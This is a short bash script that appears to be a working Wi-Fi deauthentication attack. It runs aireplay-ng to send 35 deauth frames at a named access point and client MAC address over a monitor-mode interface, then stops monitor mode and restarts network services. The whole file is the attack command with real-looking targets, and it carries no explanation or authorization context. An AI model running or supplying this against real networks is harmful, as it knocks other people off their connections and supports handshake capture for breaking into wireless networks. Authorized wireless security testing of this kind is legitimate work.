#!/bin/bash
aireplay-ng --deauth 35 -a A0:14:3D:A5:BF:13 -c 00:CD:FE:9B:6A:90 wlp2s0mon
airmon-ng stop wlp2s0mon
service network-manager start
systemctl restart networking
service network-manager start